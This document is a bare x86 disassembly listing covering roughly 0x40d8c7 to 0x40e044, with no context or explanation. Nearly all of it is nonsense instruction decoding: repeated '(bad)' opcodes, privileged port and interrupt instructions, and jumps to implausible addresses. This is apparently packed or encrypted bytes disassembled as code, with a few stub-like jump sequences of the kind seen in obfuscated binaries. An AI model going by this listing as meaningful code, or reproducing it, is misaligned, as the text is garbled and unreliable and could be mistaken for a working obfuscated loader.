  40d8c7:	stos   BYTE PTR es:[edi],al
  40d8c8:	push   ebp
  40d8c9:	stc    
  40d8ca:	imul   eax,ecx,0x28
  40d8cd:	sbb    DWORD PTR [ebx+ebx*8+0x3f],ecx
  40d8d1:	xor    eax,0x3fef219c
  40d8d6:	push   ecx
  40d8d7:	ds cwde 
  40d8d9:	loop   0x40d925
  40d8db:	inc    edi
  40d8dc:	sbb    bl,BYTE PTR [ebp+0x19ce51c9]
  40d8e2:	ins    BYTE PTR es:[edi],dx
  40d8e3:	dec    esp
  40d8e4:	cwde   
  40d8e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8e6:	popa   
  40d8e7:	(bad)  
  40d8e8:	cwde   
  40d8e9:	test   eax,0xfa8caf95
  40d8ee:	sbb    eax,0x67f9f674
  40d8f3:	xor    eax,0xb81d1fb9
  40d8f8:	(bad)  
  40d8f9:	out    dx,al
  40d8fa:	pop    eax
  40d8fb:	and    DWORD PTR [ebx-0x6aa0ac69],eax
  40d901:	daa    
  40d902:	push   esp
  40d903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d904:	xchg   ebp,eax
  40d905:	xchg   edx,eax
  40d906:	mov    ds:0x1bd2868d,eax
  40d90b:	xor    eax,0x947983fd
  40d910:	mov    al,ds:0xbeee9064
  40d915:	mov    dl,BYTE PTR [edx+ebp*1+0x37]
  40d919:	popf   
  40d91a:	cmp    ebp,DWORD PTR [ebx+0x5c]
  40d91d:	gs mov edx,0x51262222
  40d923:	ds mov ecx,0xd31f112d
  40d929:	add    bh,BYTE PTR [esi-0x7f]
  40d92c:	imul   eax,DWORD PTR [ecx+0x57e16ef4],0x61
  40d933:	cwde   
  40d934:	ja     0x40d8de
  40d936:	jnp    0x40d95a
  40d938:	inc    edi
  40d939:	add    eax,ebp
  40d93b:	hlt    
  40d93c:	push   0xf9579b83
  40d941:	scas   al,BYTE PTR es:[edi]
  40d942:	dec    ebp
  40d943:	mov    bh,0xd5
  40d945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d946:	imul   ebp,esi,0x2a3c9c9
  40d94c:	ds sub al,0x77
  40d94f:	jno    0x40d978
  40d951:	sbb    al,0x40
  40d953:	out    dx,eax
  40d954:	cmp    esi,DWORD PTR ds:0x7645e0ef
  40d95a:	fdivr  DWORD PTR [ecx]
  40d95c:	cld    
  40d95d:	scas   eax,DWORD PTR es:[edi]
  40d95e:	and    DWORD PTR [ebx-0x18],esp
  40d961:	cwde   
  40d962:	mov    edi,0xe4150ece
  40d967:	or     dh,ah
  40d969:	mov    dh,0xe4
  40d96b:	and    eax,0x42356885
  40d970:	cmp    al,0xf4
  40d973:	nop
  40d974:	mov    ebx,0x173a45aa
  40d979:	pop    eax
  40d97a:	inc    esp
  40d97b:	fcomi  st,st(6)
  40d97d:	fstp   QWORD PTR ds:0xf2248ff6
  40d984:	cmp    eax,0xd2099be5
  40d989:	data16 clc 
  40d98b:	cmp    dl,BYTE PTR [ebx]
  40d98d:	inc    esp
  40d98e:	xor    ebx,ecx
  40d990:	and    ch,ch
  40d992:	imul   eax,DWORD PTR [ebp+0x20e8e5f3],0x2d129c38
  40d99c:	iret   
  40d99d:	mov    al,0x64
  40d99f:	pusha  
  40d9a0:	hlt    
  40d9a1:	mov    dl,0xc5
  40d9a3:	jmp    0x6084ee5c
  40d9a8:	das    
  40d9a9:	das    
  40d9aa:	adc    ah,BYTE PTR [edi]
  40d9ac:	sbb    ah,bh
  40d9ae:	imul   esp,eax,0x48
  40d9b1:	cmp    eax,0x2a0e3413
  40d9b6:	mov    WORD PTR [edi+0x45fc46c1],gs
  40d9bc:	mov    esi,0xcd73fd53
  40d9c1:	jecxz  0x40d9ec
  40d9c3:	adc    ecx,DWORD PTR [edi+0x2d5d0f2f]
  40d9c9:	jg     0x40d9cc
  40d9cb:	jl     0x40d9f7
  40d9cd:	pop    es
  40d9ce:	mov    ds:0xda5fa305,eax
  40d9d3:	adc    al,0x2
  40d9d5:	mov    bl,0x64
  40d9d7:	mov    ah,0xd0
  40d9d9:	push   esp
  40d9da:	xchg   eax,eax
  40d9dc:	jne    0x40da14
  40d9de:	loope  0x40d9df
  40d9e0:	push   0x42023556
  40d9e5:	(bad)
  40d9e9:	mov    eax,ds:0x5af4538e
  40d9ee:	inc    esp
  40d9ef:	xor    al,0xa7
  40d9f1:	jnp    0x40d98d
  40d9f3:	mov    dh,0x85
  40d9f5:	ins    BYTE PTR es:[edi],dx
  40d9f6:	jae    0x40d9a7
  40d9f8:	cmp    DWORD PTR [esi+0x3b],edx
  40d9fb:	repnz enter 0x8ac3,0x76
  40da00:	(bad)  
  40da01:	xor    eax,DWORD PTR [ebx+0x66ebe286]
  40da07:	sub    ecx,ebx
  40da09:	or     BYTE PTR [edx*1+0x73559f47],ah
  40da10:	sahf   
  40da11:	aas    
  40da12:	fldcw  WORD PTR [edx+eax*8]
  40da15:	imul   ecx,DWORD PTR [edx+0x73],0x26
  40da19:	push   ebx
  40da1a:	add    eax,DWORD PTR [eax-0x28]
  40da1d:	mov    al,ds:0xdae11e3d
  40da22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da23:	xchg   ecx,eax
  40da24:	lods   eax,DWORD PTR ds:[esi]
  40da25:	add    al,0x2a
  40da27:	ins    BYTE PTR es:[edi],dx
  40da28:	fwait
  40da29:	nop
  40da2a:	shr    DWORD PTR [esi],0x12
  40da2d:	push   esp
  40da2e:	jl     0x40d9e1
  40da30:	sbb    eax,0x3d8c3292
  40da35:	es pop es
  40da37:	xor    BYTE PTR [ebx-0x4],ch
  40da3a:	cmp    DWORD PTR [edx*1+0x21b6eab7],0xffffff80
  40da42:	fwait
  40da43:	jns    0x40da2a
  40da45:	push   0x47
  40da47:	sahf   
  40da48:	xor    esp,DWORD PTR [ecx]
  40da4a:	push   eax
  40da4b:	mov    ecx,0xf833690e
  40da50:	add    edx,edi
  40da52:	mov    edi,DWORD PTR [ebp-0x8]
  40da55:	lea    edx,[edx+edi*1+0x327299]
  40da5c:	jmp    0x40de73
  40da61:	outs   dx,BYTE PTR ds:[esi]
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	shl    BYTE PTR [ebp-0x228e4a8d],cl
  40da69:	mov    dh,0x68
  40da6b:	pop    ss
  40da6c:	out    0xb,eax
  40da6e:	int3   
  40da6f:	pushf  
  40da70:	inc    eax
  40da71:	xor    ah,BYTE PTR [edx+0x79707e7e]
  40da77:	jle    0x40daf7
  40da79:	iret   
  40da7a:	ins    DWORD PTR es:[edi],dx
  40da7b:	dec    ebx
  40da7c:	xor    BYTE PTR [eax],al
  40da7e:	or     bl,BYTE PTR [eax-0x7f2d03ce]
  40da84:	retf   0x9686
  40da87:	mov    eax,ds:0x9c7a48e2
  40da8c:	pop    edi
  40da8d:	mov    ebx,ss
  40da8f:	push   ecx
  40da90:	and    dh,BYTE PTR [esi+0x3027cd9e]
  40da96:	ret    0xc725
  40da99:	inc    ecx
  40da9a:	inc    ebp
  40da9b:	and    DWORD PTR [eax+ebp*2-0x69],edi
  40da9f:	jl     0x40dab7
  40daa1:	pop    edi
  40daa2:	or     BYTE PTR [edx],ah
  40daa4:	cmc    
  40daa5:	das    
  40daa6:	data16 repnz das 
  40daa9:	ret    
  40daaa:	adc    al,0x51
  40daac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40daad:	mov    bh,0xbb
  40daaf:	mov    ds:0xa26e3a8f,al
  40dab4:	gs sbb eax,0x5bf2f32
  40daba:	in     eax,dx
  40dabb:	loopne 0x40dabc
  40dabd:	push   0xffffffe7
  40dabf:	adc    DWORD PTR [edi+0x2ea0dcc1],ecx
  40dac5:	jbe    0x40db46
  40dac7:	or     BYTE PTR [ebx+0x26],ah
  40daca:	pushf  
  40dacb:	int    0xaa
  40dacd:	add    eax,0xef7eae1e
  40dad2:	push   ecx
  40dad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dad4:	and    BYTE PTR [esp+edx*1-0x49],bh
  40dad8:	dec    ebp
  40dad9:	or     eax,0xfe5fcb3d
  40dade:	push   ebx
  40dadf:	imul   esi,DWORD PTR [esp-0x6237762a],0xc42770f9
  40daea:	mov    ds:0x6b7e78a1,eax
  40daef:	dec    ebx
  40daf0:	repz inc ecx
  40daf2:	retf   
  40daf3:	daa    
  40daf4:	add    al,0xa
  40daf6:	sub    ch,BYTE PTR [esp+edx*8+0x2ff78537]
  40dafd:	push   ebx
  40dafe:	xchg   BYTE PTR [eax+0x7673aee4],cl
  40db04:	ss jae 0x40db0f
  40db07:	adc    dh,BYTE PTR [esi+ebx*8+0x6def01ec]
  40db0e:	pop    edi
  40db0f:	out    0xb5,al
  40db11:	mov    ebp,0x5546a6d1
  40db16:	xor    DWORD PTR [eax-0x1b],ebx
  40db19:	jmp    0x40db73
  40db1b:	sahf   
  40db1c:	(bad)  
  40db1e:	pop    fs
  40db20:	hlt    
  40db21:	and    BYTE PTR [edi],0xfd
  40db24:	sbb    ch,BYTE PTR [edx]
  40db26:	push   ds
  40db27:	dec    edi
  40db28:	mov    ebx,0x4c3d19e3
  40db2d:	int    0x2e
  40db2f:	xor    bh,0x39
  40db32:	fwait
  40db33:	inc    esp
  40db34:	fdiv   QWORD PTR ds:0x726ed539
  40db3a:	shr    DWORD PTR [eax],cl
  40db3c:	cld    
  40db3d:	outs   dx,BYTE PTR ds:[esi]
  40db3e:	fcomp  QWORD PTR [ecx*4-0x851c9fa]
  40db45:	stc    
  40db46:	inc    ebx
  40db47:	sbb    BYTE PTR [ebx],al
  40db49:	xlat   BYTE PTR ds:[ebx]
  40db4a:	jmp    0x667b8fd6
  40db4f:	or     DWORD PTR [edx+0x6d63b41e],esp
  40db55:	xor    eax,esi
  40db57:	in     eax,0xd0
  40db59:	out    0xe2,al
  40db5b:	dec    ebp
  40db5c:	adc    BYTE PTR [edx],ah
  40db5e:	(bad)  
  40db5f:	sub    al,0x35
  40db61:	pusha  
  40db62:	xlat   BYTE PTR ds:[ebx]
  40db63:	mov    bh,0xfa
  40db65:	shr    BYTE PTR [esi+0x27346af2],1
  40db6b:	scas   eax,DWORD PTR es:[edi]
  40db6c:	retf   0x775c
  40db6f:	add    esi,DWORD PTR [edi]
  40db71:	fst    QWORD PTR [esi+0x3c]
  40db74:	mov    cl,0xf5
  40db76:	cmp    dl,BYTE PTR [edx+edi*4+0x0]
  40db7a:	dec    edx
  40db7b:	mov    edi,esp
  40db7d:	inc    edi
  40db7e:	ds in  eax,0x87
  40db81:	and    eax,0xb65be3bb
  40db86:	xchg   esi,eax
  40db87:	push   ebp
  40db88:	nop
  40db89:	mov    esp,DWORD PTR [ebx]
  40db8b:	pop    ds
  40db8c:	jmp    0x40db61
  40db8e:	adc    dh,BYTE PTR [edx]
  40db90:	mov    bl,0x9f
  40db92:	and    edx,DWORD PTR [eax+0x75]
  40db95:	jg     0x40db37
  40db97:	sbb    DWORD PTR [edi+ebp*4+0x70],ebp
  40db9b:	scas   al,BYTE PTR es:[edi]
  40db9c:	mov    edi,0xb52a1be5
  40dba1:	mov    eax,ds:0xae052baa
  40dba6:	gs repz jo 0x40dbda
  40dbaa:	xchg   edx,eax
  40dbab:	inc    edx
  40dbac:	sbb    al,0x99
  40dbae:	jg     0x40db39
  40dbb0:	je     0x40db99
  40dbb2:	scas   al,BYTE PTR es:[edi]
  40dbb3:	das    
  40dbb4:	xchg   ebp,eax
  40dbb5:	clc    
  40dbb6:	inc    edx
  40dbb7:	jmp    FWORD PTR [ebx-0x3ec94902]
  40dbbd:	or     al,BYTE PTR [ebp+0x6e4ca154]
  40dbc3:	cwde   
  40dbc4:	mov    dh,0x12
  40dbc6:	scas   eax,DWORD PTR es:[edi]
  40dbc7:	adc    eax,0xb31bf4f8
  40dbcc:	push   esp
  40dbcd:	mov    dl,BYTE PTR [esi]
  40dbcf:	and    BYTE PTR [esi+esi*1],ch
  40dbd2:	lock adc al,0xb0
  40dbd5:	sub    bl,BYTE PTR [esi*1-0x341cdd2b]
  40dbdc:	cmp    edi,eax
  40dbde:	in     eax,0xc6
  40dbe0:	out    0x5d,al
  40dbe2:	cli    
  40dbe3:	jmp    0x6b05:0xbe4f57f9
  40dbea:	sub    al,0x2
  40dbec:	inc    ebp
  40dbed:	popa   
  40dbee:	sub    ecx,edi
  40dbf0:	and    bh,0x5c
  40dbf3:	rcr    DWORD PTR [edi],cl
  40dbf5:	in     al,0x26
  40dbf7:	cmp    al,0x7f
  40dbf9:	pusha  
  40dbfa:	mov    ch,0xe0
  40dbfc:	sbb    al,0xbf
  40dbfe:	cmp    edx,ecx
  40dc00:	inc    ebp
  40dc01:	mov    edx,0x1d9b0f15
  40dc06:	push   es
  40dc07:	addr16 adc eax,0xf594ab4f
  40dc0d:	aad    0xb8
  40dc0f:	cmp    bl,BYTE PTR [edx]
  40dc11:	xchg   ebx,eax
  40dc12:	scas   al,BYTE PTR es:[edi]
  40dc13:	xlat   BYTE PTR ds:[ebx]
  40dc14:	into   
  40dc15:	push   ebx
  40dc16:	inc    eax
  40dc17:	rcl    BYTE PTR [edx+eax*8],1
  40dc1a:	scas   al,BYTE PTR es:[edi]
  40dc1b:	and    al,0x4b
  40dc1d:	and    al,0xa5
  40dc1f:	xchg   ebp,eax
  40dc20:	aam    0xd7
  40dc22:	std    
  40dc23:	retf   0x5267
  40dc26:	dec    eax
  40dc27:	inc    edi
  40dc28:	(bad)  [ebp+0x755a08a8]
  40dc2e:	stos   BYTE PTR es:[edi],al
  40dc2f:	call   0x2d44:0x5ad7448b
  40dc36:	cmp    esp,edi
  40dc38:	shl    ecx,0x47
  40dc3b:	ror    edx,1
  40dc3d:	leave  
  40dc3e:	test   ebp,0xe2a84e83
  40dc44:	adc    al,0xe7
  40dc46:	cs in  al,dx
  40dc48:	scas   al,BYTE PTR es:[edi]
  40dc49:	mul    DWORD PTR [esp+eax*4+0x6079c404]
  40dc50:	jns    0x40dc7a
  40dc52:	sub    dh,ch
  40dc54:	mov    edx,0x843115ee
  40dc59:	and    ebp,DWORD PTR [eax]
  40dc5b:	pop    edi
  40dc5c:	mov    ah,0x11
  40dc5e:	fdiv   QWORD PTR [ebx-0xb01c5a1]
  40dc64:	sbb    ebp,ebx
  40dc66:	inc    ebx
  40dc67:	cmp    dl,BYTE PTR [ecx-0x4b60750d]
  40dc6d:	adc    esi,DWORD PTR [esi]
  40dc6f:	cmp    eax,0x95d96023
  40dc74:	xchg   ecx,eax
  40dc75:	cdq    
  40dc76:	fld    TBYTE PTR ds:0x9fd8d449
  40dc7c:	stos   DWORD PTR es:[edi],eax
  40dc7d:	mov    DWORD PTR [edx+0x24],esi
  40dc80:	xchg   ebx,eax
  40dc81:	jle    0x40dc4e
  40dc83:	dec    eax
  40dc84:	xor    al,0xcb
  40dc86:	or     eax,0x621b7af8
  40dc8b:	xor    BYTE PTR [eax+0x14cfee17],dh
  40dc91:	stos   DWORD PTR es:[edi],eax
  40dc92:	jne    0x40dc16
  40dc94:	mov    eax,ds:0x4798e209
  40dc99:	ja     0x40dd0b
  40dc9b:	pushf  
  40dc9c:	cmc    
  40dc9d:	ror    DWORD PTR [ebx+0x2aac4c43],cl
  40dca3:	fistp  DWORD PTR [edx+0x4a]
  40dca6:	pop    ebp
  40dca7:	mov    esi,0xfe1fe57b
  40dcac:	daa    
  40dcad:	and    BYTE PTR [edx],0x91
  40dcb0:	lea    ebx,[ebx]
  40dcb2:	inc    eax
  40dcb3:	mov    cl,0x96
  40dcb5:	dec    edx
  40dcb6:	shl    DWORD PTR [ecx-0x27],cl
  40dcb9:	xchg   DWORD PTR [ebp-0x52ae5f67],eax
  40dcbf:	and    BYTE PTR [esi+0x46391e70],bh
  40dcc5:	popa   
  40dcc6:	idiv   DWORD PTR [esi+0x3d]
  40dcc9:	test   DWORD PTR [ecx],ecx
  40dccb:	aam    0x24
  40dccd:	lock ror cl,1
  40dcd0:	cmp    DWORD PTR [eax],0xdaa4d33e
  40dcd6:	out    dx,eax
  40dcd7:	xor    al,0xbf
  40dcd9:	hlt    
  40dcda:	sbb    DWORD PTR [edi+0x15],eax
  40dcdd:	jns    0x40dd12
  40dcdf:	mov    esi,0x44c1fc26
  40dce4:	inc    esp
  40dce5:	ror    esi,0x80
  40dce8:	xor    esp,DWORD PTR [ecx-0x33]
  40dceb:	mov    bh,0x3c
  40dced:	inc    eax
  40dcee:	imul   esp,DWORD PTR [esi-0x70dd9c1],0x5a
  40dcf5:	ret    
  40dcf6:	inc    ecx
  40dcf7:	pop    eax
  40dcf8:	or     ah,ah
  40dcfa:	ss pop edx
  40dcfc:	pop    esp
  40dcfd:	loop   0x40dd0f
  40dcff:	push   0xfffffff7
  40dd01:	mov    edx,0x659118b4
  40dd06:	das    
  40dd07:	repnz add al,0x15
  40dd0a:	rol    BYTE PTR [ecx+ebx*1],cl
  40dd0d:	pop    DWORD PTR [edx]
  40dd0f:	sbb    edx,DWORD PTR [edi]
  40dd11:	or     cl,ch
  40dd13:	outs   dx,BYTE PTR ds:[esi]
  40dd14:	mov    ch,0x3f
  40dd16:	int    0x49
  40dd18:	adc    al,dl
  40dd1a:	xor    DWORD PTR [esi],ebx
  40dd1c:	pop    ss
  40dd1d:	ss xchg ebx,eax
  40dd1f:	mov    ds:0x99345007,al
  40dd24:	int3   
  40dd25:	and    al,0x6d
  40dd27:	shl    DWORD PTR [ecx+0x64124735],0x97
  40dd2e:	and    edx,DWORD PTR [edi-0x39]
  40dd31:	scas   eax,DWORD PTR es:[edi]
  40dd32:	push   0x45
  40dd34:	inc    ecx
  40dd35:	or     al,0x37
  40dd37:	fistp  WORD PTR [edx]
  40dd39:	inc    ebp
  40dd3a:	xor    al,BYTE PTR [edx-0x51d67afd]
  40dd40:	push   es
  40dd41:	mov    esp,0x756721ca
  40dd46:	push   ecx
  40dd47:	je     0x40dd6d
  40dd49:	es dec eax
  40dd4b:	ins    BYTE PTR es:[edi],dx
  40dd4c:	jae    0x40dd43
  40dd4e:	pop    ebx
  40dd4f:	int    0x10
  40dd51:	sub    BYTE PTR [esi+0x59],dh
  40dd54:	and    BYTE PTR [esp+edx*8-0x5df0ccc9],0xe5
  40dd5c:	dec    ecx
  40dd5d:	add    esi,ebp
  40dd5f:	(bad)  
  40dd60:	call   0xe073:0x2ef8d00
  40dd67:	shl    edi,0x53
  40dd6a:	xchg   ecx,eax
  40dd6b:	aas    
  40dd6c:	inc    edx
  40dd6d:	or     bh,bh
  40dd6f:	into   
  40dd70:	xor    al,bh
  40dd72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd73:	mov    ds:0xa47ecb50,eax
  40dd78:	sbb    al,0xd3
  40dd7a:	arpl   WORD PTR [ecx],bx
  40dd7c:	retf   
  40dd7d:	mov    ds:0x9ab7b0a5,eax
  40dd82:	cdq    
  40dd83:	or     eax,0xb55847dd
  40dd88:	ret    
  40dd89:	and    al,0xbe
  40dd8b:	push   eax
  40dd8c:	jno    0x40ddf4
  40dd8e:	pop    ss
  40dd8f:	jae    0x40dd21
  40dd91:	sub    DWORD PTR [edi+0x58],ebx
  40dd94:	adc    dl,cl
  40dd96:	(bad)  
  40dd97:	xor    DWORD PTR [edi],edx
  40dd99:	pop    es
  40dd9a:	dec    ebp
  40dd9b:	dec    edx
  40dd9c:	les    ebp,FWORD PTR [eax+0x77]
  40dd9f:	add    edi,ebx
  40dda1:	pop    edi
  40dda2:	cli    
  40dda3:	adc    ebp,DWORD PTR [ebx+eiz*2]
  40dda6:	sbb    bh,BYTE PTR [eax-0x2f6806c9]
  40ddac:	in     al,dx
  40ddad:	push   ds
  40ddae:	and    al,0xf7
  40ddb0:	test   eax,0x6798c808
  40ddb5:	add    al,0x67
  40ddb7:	imul   ebp,ecx,0x4e
  40ddba:	adc    ch,ah
  40ddbc:	jecxz  0x40ddd2
  40ddbe:	aas    
  40ddbf:	imul   edi,ebx,0x80f6fe66
  40ddc5:	and    al,0xdc
  40ddc7:	xor    DWORD PTR [edi-0x30],esp
  40ddca:	ins    BYTE PTR es:[edi],dx
  40ddcb:	in     al,dx
  40ddcc:	stos   DWORD PTR es:[edi],eax
  40ddcd:	jl     0x40ddba
  40ddcf:	int3   
  40ddd0:	das    
  40ddd1:	frstor [eax-0x5b619d58]
  40ddd7:	mov    bh,0xff
  40ddd9:	int3   
  40ddda:	mov    DWORD PTR [ebp+0x53d76e05],0x107e0c4a
  40dde4:	mov    ebp,0xe8778ea2
  40dde9:	cld    
  40ddea:	mov    esi,0xab2fa27e
  40ddef:	ss and al,0x6d
  40ddf2:	retf   
  40ddf3:	lods   eax,DWORD PTR ds:[esi]
  40ddf4:	int    0xc4
  40ddf6:	pushf  
  40ddf7:	clc    
  40ddf8:	lahf   
  40ddf9:	(bad)  
  40ddfa:	shl    DWORD PTR [esi-0x62],1
  40ddfd:	and    ch,BYTE PTR [edi+eiz*4-0x73627ff]
  40de04:	fiadd  WORD PTR [ebx+0x52b3095]
  40de0a:	or     eax,0xed741398
  40de0f:	int    0xa5
  40de11:	js     0x40dda6
  40de13:	xchg   esp,eax
  40de14:	retf   0x5a6c
  40de17:	in     eax,0x25
  40de19:	or     cl,BYTE PTR [ebx]
  40de1b:	pop    esp
  40de1c:	fld    TBYTE PTR [edi-0x1056e1c6]
  40de22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de23:	inc    edx
  40de24:	lea    esi,[ebx]
  40de26:	push   ebx
  40de27:	js     0x40de43
  40de29:	aas    
  40de2a:	mov    fs,edi
  40de2c:	(bad)  
  40de2d:	mov    dh,0x4d
  40de2f:	adc    BYTE PTR [ebp-0x13],ah
  40de32:	jecxz  0x40de5b
  40de34:	mov    esi,0x5375d0e9
  40de39:	mov    DWORD PTR [esi+0x56],ecx
  40de3c:	cmp    ebp,0x7a6bae27
  40de42:	or     eax,0xaf1bd1d2
  40de47:	xchg   ecx,eax
  40de48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de49:	fmul   QWORD PTR [ebp+0x446ac026]
  40de4f:	pop    edx
  40de50:	jg     0x40de44
  40de52:	popa   
  40de53:	push   es
  40de54:	push   0x70
  40de56:	(bad)  
  40de57:	icebp  
  40de58:	cs inc esp
  40de5a:	inc    ecx
  40de5b:	out    0x51,al
  40de5d:	into   
  40de5e:	arpl   WORD PTR [ecx+ebx*2-0x77],ax
  40de62:	inc    esi
  40de63:	jmp    0x4017da4a
  40de68:	pusha  
  40de69:	sub    BYTE PTR [esp+ecx*4-0x8b81a05],ah
  40de70:	bound  edx,QWORD PTR [esi-0x7aa76ee]
  40de76:	mov    edx,DWORD PTR [ebp-0x20]
  40de79:	xor    edx,eax
  40de7b:	mov    edi,0xffcd8d67
  40de80:	jmp    0x40e297
  40de85:	sahf   
  40de86:	call   0xb371:0x5de417d8
  40de8d:	adc    al,0xe5
  40de8f:	and    DWORD PTR [edx],edx
  40de91:	jmp    0x7eae:0x34bce3dc
  40de98:	jle    0x40df0a
  40de9a:	jns    0x40df1a
  40de9c:	jle    0x40de46
  40de9e:	xchg   edi,eax
  40de9f:	(bad)
  40dea2:	sar    DWORD PTR [ebx-0x4645166f],cl
  40dea8:	push   eax
  40dea9:	loop   0x40de2c
  40deab:	jmp    0x40df2c
  40dead:	sub    BYTE PTR [eax],0x56
  40deb0:	pop    edi
  40deb1:	je     0x40ded3
  40deb3:	mov    ah,0xf1
  40deb5:	jno    0x40df14
  40deb7:	in     eax,0xcc
  40deb9:	les    ebx,FWORD PTR [eax]
  40debb:	dec    DWORD PTR [edx+ecx*4-0x5652d2a]
  40dec2:	fs inc ebx
  40dec4:	push   esp
  40dec5:	loopne 0x40df3d
  40dec7:	xchg   ecx,eax
  40dec8:	or     eax,DWORD PTR [ebx+0x61]
  40decb:	mov    ds:0x547ab30b,al
  40ded0:	adc    al,0xda
  40ded2:	xchg   esi,eax
  40ded3:	cmp    dl,BYTE PTR [eax-0xe109152]
  40ded9:	sub    al,0xac
  40dedb:	popa   
  40dedc:	stos   BYTE PTR es:[edi],al
  40dedd:	cmc    
  40dede:	pop    eax
  40dedf:	adc    DWORD PTR [ebx],eax
  40dee1:	call   0xf681:0x7edfa1a6
  40dee8:	stos   BYTE PTR es:[edi],al
  40dee9:	xor    esi,DWORD PTR [edx-0x762fb68f]
  40deef:	xor    DWORD PTR [eax-0x62],edi
  40def2:	(bad)  
  40def3:	ds leave 
  40def5:	aad    0x42
  40def7:	mov    ebp,0xc7ce15f9
  40defc:	popa   
  40defd:	sbb    al,0x7a
  40deff:	mov    ch,BYTE PTR [esi]
  40df01:	mov    gs,eax
  40df03:	adc    ah,bl
  40df05:	sar    BYTE PTR [ebx+0x3ea6c4b2],1
  40df0b:	or     al,BYTE PTR [edx]
  40df0d:	adc    ebx,DWORD PTR [ebx+0x6]
  40df10:	inc    esp
  40df11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df13:	test   eax,0xa0681451
  40df18:	aaa    
  40df19:	lds    ebp,FWORD PTR [esi+0x22]
  40df1c:	out    0x2f,al
  40df1e:	aas    
  40df1f:	pop    ss
  40df20:	dec    ecx
  40df21:	xor    BYTE PTR [esi+0x3b],0x94
  40df25:	(bad)  
  40df26:	jnp    0x40df7f
  40df28:	lea    edx,[ebp+ebp*4-0x7ce7b068]
  40df2f:	mov    ?,esp
  40df31:	je     0x40dfac
  40df33:	(bad)  
  40df35:	cs mov bh,dh
  40df38:	inc    eax
  40df39:	imul   ecx,DWORD PTR [edx-0x342527cd],0xfffffff5
  40df40:	mov    ds:0xf8079627,al
  40df45:	push   ebp
  40df46:	cmp    DWORD PTR cs:[edi+0x3a],ecx
  40df4a:	ss enter 0x241c,0xa6
  40df4f:	stc    
  40df50:	stos   DWORD PTR es:[edi],eax
  40df51:	and    ah,dh
  40df53:	daa    
  40df54:	mov    eax,0x94503024
  40df59:	push   ebx
  40df5a:	mov    ds:0xf7b7dcae,al
  40df5f:	iret   
  40df60:	adc    dh,BYTE PTR [ecx+0x346a882e]
  40df66:	rol    DWORD PTR [ebp-0x78],1
  40df69:	jl     0x40df32
  40df6b:	jge    0x40dfb9
  40df6d:	and    cl,BYTE PTR [edi+0x6]
  40df70:	add    eax,0x913075da
  40df75:	arpl   cx,ax
  40df77:	dec    ebx
  40df78:	popf   
  40df79:	add    bl,BYTE PTR [ebx]
  40df7b:	adc    edi,DWORD PTR [eax]
  40df7d:	or     ebp,DWORD PTR [edi+0x360d8bb2]
  40df83:	inc    ecx
  40df84:	imul   eax,DWORD PTR [edi],0xffffff81
  40df87:	pop    eax
  40df88:	cli    
  40df89:	mov    ch,0x73
  40df8b:	push   esp
  40df8c:	push   0x926a1eae
  40df91:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40df93:	mov    ds:0xdc28290,eax
  40df98:	das    
  40df99:	xor    ebx,DWORD PTR ds:0xfc47e2c2
  40df9f:	addr16 push cs
  40dfa1:	add    DWORD PTR [edi],edi
  40dfa3:	repz fs push 0xffffffbd
  40dfa7:	mov    al,0xa8
  40dfa9:	pop    ebx
  40dfaa:	es adc eax,0x8c9e8b74
  40dfb0:	outs   dx,DWORD PTR ds:[esi]
  40dfb1:	pop    eax
  40dfb2:	mov    ebx,0xfcb8aabe
  40dfb7:	int    0xb9
  40dfb9:	sti    
  40dfba:	repz aaa 
  40dfbc:	sbb    bh,BYTE PTR [eax+0x2c]
  40dfbf:	or     ebx,DWORD PTR ds:0x2deff024
  40dfc5:	cmp    eax,0xf73fbc77
  40dfca:	mov    ebp,0x76dce64a
  40dfcf:	xchg   edi,eax
  40dfd0:	push   0x2b
  40dfd2:	out    dx,eax
  40dfd3:	cld    
  40dfd4:	xor    ecx,DWORD PTR [edi]
  40dfd6:	push   edx
  40dfd7:	jl     0x40df5a
  40dfd9:	aam    0x9f
  40dfdb:	call   eax
  40dfdd:	shl    DWORD PTR [edx+esi*2-0x2e],cl
  40dfe1:	jne    0x40dfd9
  40dfe3:	mov    dh,0x7e
  40dfe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfe6:	psubusb mm3,QWORD PTR [ebp+0x530b65ae]
  40dfed:	cmp    al,0x1a
  40dfef:	mov    edi,0xd72d8701
  40dff4:	cs das 
  40dff6:	fsub   DWORD PTR [eax]
  40dff8:	cwde   
  40dff9:	in     eax,dx
  40dffa:	in     eax,0xa4
  40dffc:	test   DWORD PTR [edi+0x5d],ecx
  40dfff:	add    cl,BYTE PTR [edi+0x6ca0f7a0]
  40e005:	popa   
  40e006:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e008:	and    eax,0xbe93afbe
  40e00d:	(bad)  
  40e00e:	ds jnp 0x40e059
  40e011:	mov    esi,DWORD PTR [edx+0x8]
  40e014:	scas   al,BYTE PTR es:[edi]
  40e015:	xor    eax,0x9f6611cc
  40e01a:	in     eax,0x4
  40e01c:	test   DWORD PTR [ebx],edi
  40e01e:	xchg   esp,eax
  40e01f:	mov    esi,0xb698e1ae
  40e024:	rcl    DWORD PTR [edx+0x29],1
  40e027:	mov    bl,0x2f
  40e029:	in     al,dx
  40e02a:	mov    ch,0x98
  40e02c:	jne    0x40e04a
  40e02e:	mov    eax,DWORD PTR [edx+0x77]
  40e031:	push   ds
  40e032:	inc    esi
  40e033:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e034:	or     cl,BYTE PTR [esi]
  40e036:	mov    ?,WORD PTR ds:0x82bca17d
  40e03c:	mov    esi,0xcab7e8a0
  40e041:	cwde   
  40e042:	jne    0x40dfe4
  40e044:	cmp    BYTE PTR [eax-0x19359f2b],0x0
